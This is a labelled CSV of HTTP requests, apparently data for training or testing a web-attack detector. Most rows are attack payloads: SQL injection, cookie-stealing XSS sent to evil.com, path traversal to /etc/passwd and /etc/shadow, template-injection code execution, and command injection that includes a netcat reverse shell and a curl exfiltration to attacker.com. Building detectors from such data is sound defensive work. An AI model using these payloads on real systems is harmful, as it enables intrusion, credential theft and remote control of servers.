request_normalized,label
"GET /view?doc=../../../../etc/shadow HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /contact HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

name=bob_jones&email=info@site.net&message=Hello World",benign
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 22

input={{7*7}}&submit=1",rce
"GET /template?expr=<?php system($_GET['cmd']); ?> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /assets?path=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

input=../../../proc/self/environ&submit=1",path_traversal
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

input=| net user&submit=1",cmdi
"GET /user?id=1'; INSERT INTO users VALUES('hacker','hacked')-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /download?file=....//....//etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /view?doc=../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /template?expr=eval(base64_decode('c3lzdGVtKCdpZCcp')); HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /tools/lookup?domain=$(id) HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /feedback?msg=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 85

input=<img src='x' onerror='this.src=""http://evil.com/?c="" document.cookie'>&submit=1",xss
"GET /view?doc=../etc/passwd.jpg HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 42

{""username"":""alice_miller"",""password"":""1ea0d763""}",benign
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

input=[[${7*7}]]&submit=1",rce
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

input=$(cat /etc/passwd)&submit=1",cmdi
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

input=../../../../etc/passwd&submit=1",path_traversal
"POST /api/items?name=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

input=' UNION ALL SELECT NULL,NULL,NULL--&submit=1",sqli
"GET /exec?cmd=| curl http://attacker.com/$(whoami) HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /profile?bio=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 58

input=<iframe src='javascript:alert(1)'></iframe>&submit=1",xss
"POST /user?id=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

input=' OR 1=1--&submit=1",sqli
"GET /news/article/top-10-tips HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

input=../../../../etc/shadow&submit=1",path_traversal
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

input=[[${7*7}]]&submit=1",rce
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 66

input=1' UNION SELECT null,username,password FROM users--&submit=1",sqli
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

input=' OR 1=1 LIMIT 1--&submit=1",sqli
"GET /exec?cmd=& echo test > /tmp/pwned HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /api/items?name=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

input='; EXEC xp_cmdshell('dir')--&submit=1",sqli
"GET /image?src=../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

input=..\..\..\windows\win.ini&submit=1",path_traversal
"GET /comment?text=<details open ontoggle=alert(1)> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /eval?code=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 116

input={{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}&submit=1",rce
"GET /exec?cmd=; ls -la HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

input=<a href='javascript:alert(1)'>click me</a>&submit=1",xss
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

input=x' AND email IS NULL; --&submit=1",sqli
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 46

input=../../../etc/passwd&submit=1",path_traversal
"GET /favicon.ico HTTP/1.1
Host: example.com",benign
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

input=${T(java.lang.Runtime).getRuntime().exec('id')}&submit=1",rce
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

input={{lipsum.__globals__['os'].popen('id').read()}}&submit=1",rce
"GET /download?file=/var/www/../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 45

input=<?php system($_GET['cmd']); ?>&submit=1",rce
"GET /products?filter='; EXEC xp_cmdshell('dir')-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /api/items?name=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

input=x' AND email IS NULL; --&submit=1",sqli
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

input=; ls -la&submit=1",cmdi
"GET /view?doc=../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /api/ping?host=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

input=; ping -c 4 attacker.com&submit=1",cmdi
"GET /template?expr=eval(base64_decode('c3lzdGVtKCdpZCcp')); HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /comment?text=<script>alert('xss')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /feedback?msg=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

input=<a href='javascript:alert(1)'>click me</a>&submit=1",xss
"POST /user?id=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

input=1'; DROP TABLE users--&submit=1",sqli
"GET /exec?cmd=&& cat /etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /profile?bio=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

input='-alert(1)-'&submit=1",xss
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

input=../etc/passwd&submit=1",path_traversal
"POST /contact HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

name=jane_smith&email=admin@test.org&message=Hello World",benign
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

input=; ls -la&submit=1",cmdi
"GET /image?src=/var/www/../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /assets?path=....//....//etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /profile?bio=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

input=<details open ontoggle=alert(1)>&submit=1",xss
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 66

input=1' UNION SELECT null,username,password FROM users--&submit=1",sqli
"GET /api/products?category=camera&page=44&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 42

{""username"":""bob_jones"",""password"":""6193979d""}",benign
"POST /profile?bio=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

input=""><script>alert(document.cookie)</script>&submit=1",xss
"GET /view?doc=../../../../../../../../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /comment?text=<input type=text value='' onfocus=alert(1) autofocus> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /api/process?data=<% Runtime.getRuntime().exec('id') %> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

input=..\..\..\windows\win.ini&submit=1",path_traversal
"GET /user?id=' OR 'x'='x HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /comment?text=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 95

input=<script>document.write('<img src=http://evil.com/' document.cookie '>')</script>&submit=1",xss
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

input=<img src=x onerror=alert('XSS')>&submit=1",xss
"GET /image?src=....\....\....\windows\system32\drivers\etc\hosts HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /api/users/6829/update HTTP/1.1
Host: api.example.com
Content-Type: application/json

{""name"":""john_doe"",""email"":""admin@test.org""}",benign
"POST /api/ping?host=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

input=& ipconfig&submit=1",cmdi
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

input=$(id)&submit=1",cmdi
"GET /api/ping?host=; systeminfo HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /favicon.ico HTTP/1.1
Host: example.com",benign
"GET /assets?path=file:///etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /view?doc=../../boot.ini HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /download?file=..\..\..\windows\win.ini HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /admin/run?input=| nc attacker.com 4444 -e /bin/bash HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /image?src=/etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

input=..\..\..\windows\win.ini&submit=1",path_traversal
"POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 42

{""username"":""john_doe"",""password"":""26186fd2""}",benign
"GET /user?id=1' OR 1=1-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /contact HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

name=jane_smith&email=user@example.com&message=Hello World",benign
"GET /images/img_2336.jpg HTTP/1.1
Host: cdn.example.com
Referer: https://example.com/",benign
"GET /exec?cmd=| curl http://attacker.com/$(whoami) HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /template?expr=`php -r 'system(""id"");'` HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /download?file=../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /template?expr=exec('import os; os.system(""calc.exe"")') HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /api/ping?host=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

input=$(cat /etc/passwd)&submit=1",cmdi
"GET /products?filter=1'; INSERT INTO users VALUES('hacker','hacked')-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /api/users/1091/update HTTP/1.1
Host: api.example.com
Content-Type: application/json

{""name"":""john_doe"",""email"":""admin@test.org""}",benign
"GET /api/v2/orders?status=pending&user_id=1497 HTTP/1.1
Host: api.example.com
Authorization: Bearer 2d1e5c87a481024ac5fc54c37f1a7872",benign
"POST /feedback?msg=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

input=javascript:alert('XSS')&submit=1",xss
"POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 42

{""username"":""john_doe"",""password"":""db2be6b8""}",benign
"POST /api/items?name=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 72

input=' OR EXISTS(SELECT * FROM users WHERE username='admin')--&submit=1",sqli
"GET /search?q=1'; DROP TABLE users-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /api/products?category=tablet&page=29&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"POST /profile?bio=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 47

input=<details open ontoggle=alert(1)>&submit=1",xss
"GET /api/products?category=laptop&page=5&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"GET /profile?bio=<img src=x onerror=alert('XSS')> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /tools/lookup?domain=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

input=& echo test > /tmp/pwned&submit=1",cmdi
"GET /exec?cmd=; ping -c 4 attacker.com HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /download?file=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 37

input=....//....//etc/passwd&submit=1",path_traversal
"POST /contact HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

name=alice_miller&email=admin@test.org&message=Hello World",benign
"GET /feedback?msg=<img src=x onerror=alert('XSS')> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /search?q=<script>document.write('<img src=http://evil.com/' document.cookie '>')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /feedback?msg=<script>alert('XSS')</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"POST /api/items?name=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

input=admin'--&submit=1",sqli
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 62

input={{lipsum.__globals__['os'].popen('id').read()}}&submit=1",rce
"GET /api/categories HTTP/1.1
Host: example.com
Accept: application/json",benign
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 81

input=' AND 1=2 UNION SELECT table_name FROM information_schema.tables--&submit=1",sqli
"GET /profile?bio=<details open ontoggle=alert(1)> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /api/products?category=watch&page=1&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"GET /api/categories HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /news/article/top-10-tips HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"GET /template?expr=<?php system($_GET['cmd']); ?> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /user?id=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

input=' OR 1=1--&submit=1",sqli
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 33

input=$(cat /etc/passwd)&submit=1",cmdi
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

input=';alert(String.fromCharCode(88,83,83))//&submit=1",xss
"GET /profile?bio=<SCRIPT SRC=http://evil.com/xss.js></SCRIPT> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /admin/run?input=| nslookup attacker.com HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /profile?bio=<iframe src='javascript:alert(1)'></iframe> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /images/img_3931.jpg HTTP/1.1
Host: cdn.example.com
Referer: https://example.com/",benign
"GET /exec?cmd=| curl http://attacker.com/$(whoami) HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /exec?cmd=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

input=; systeminfo&submit=1",cmdi
"POST /calc?formula=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

input=java.lang.Runtime.exec('id')&submit=1",rce
"GET /search?q=<img src='x' onerror='this.src=""http://evil.com/?c="" document.cookie'> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /eval?code={{7*7}} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /profile?bio=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 44

input=<script>alert('XSS')</script>&submit=1",xss
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 40

input=/var/www/../../etc/passwd&submit=1",path_traversal
"GET /calc?formula={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /tools/lookup?domain=| nslookup attacker.com HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /image?src=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

input=../../boot.ini&submit=1",path_traversal
"POST /template?expr=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 55

input=exec('import os; os.system(""calc.exe"")')&submit=1",rce
"POST /api/users/7984/update HTTP/1.1
Host: api.example.com
Content-Type: application/json

{""name"":""jane_smith"",""email"":""info@site.net""}",benign
"POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 42

{""username"":""alice_miller"",""password"":""3b4f05e5""}",benign
"GET /exec?cmd=| type C:\Windows\win.ini HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /exec?cmd=&& cat /etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /search?q=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

input=' OR '1'='1&submit=1",sqli
"GET /api/products?category=laptop&page=41&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"GET /assets?path=../////etc/////passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"POST /comment?text=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

input=<script>alert('XSS')</script>&submit=1",xss
"GET /tools/lookup?domain=; cat /etc/shadow HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /calc?formula=${7*7} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /comment?text=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 41

input=<body onload=alert('XSS')>&submit=1",xss
"POST /products?filter=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

input=1'; INSERT INTO users VALUES('hacker','hacked')--&submit=1",sqli
"GET /calc?formula=*{7*7} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"POST /feedback?msg=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 27

input='-alert(1)-'&submit=1",xss
"GET /comment?text=""><script>alert(document.cookie)</script> HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",xss
"GET /news/article/top-10-tips HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"GET /api/products?category=phone&page=13&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"POST /api/process?data=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 43

input=java.lang.Runtime.exec('id')&submit=1",rce
"GET /news/article/breaking-news HTTP/1.1
Host: news.example.com
Accept: text/html",benign
"POST /feedback?msg=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 85

input=<img src='x' onerror='this.src=""http://evil.com/?c="" document.cookie'>&submit=1",xss
"GET /api/ping?host=| type C:\Windows\win.ini HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /api/products?category=tablet&page=36&sort=price HTTP/1.1
Host: shop.example.com
User-Agent: Mozilla/5.0
Accept: application/json",benign
"GET /calc?formula=*{7*7} HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",rce
"GET /tools/lookup?domain=| type C:\Windows\win.ini HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"POST /view?doc=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 51

input=����/����/etc/passwd&submit=1",path_traversal
"GET /user?id=1' OR 1=1-- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"POST /api/login HTTP/1.1
Host: example.com
Content-Type: application/json
Content-Length: 42

{""username"":""bob_jones"",""password"":""7db0f226""}",benign
"GET /exec?cmd=1 && dir HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",cmdi
"GET /products?filter=x' AND email IS NULL; -- HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",sqli
"GET /download?file=../../../../../../../../../../etc/passwd HTTP/1.1
Host: target.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
Accept: text/html,application/json",path_traversal
"GET /api/v2/orders?status=pending&user_id=5301 HTTP/1.1
Host: api.example.com
Authorization: Bearer 45a4ad446c02c4bde9bc85d95103157a",benign
"POST /user?id=data HTTP/1.1
Host: target.example.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

input=x' AND email IS NULL; --&submit=1",sqli
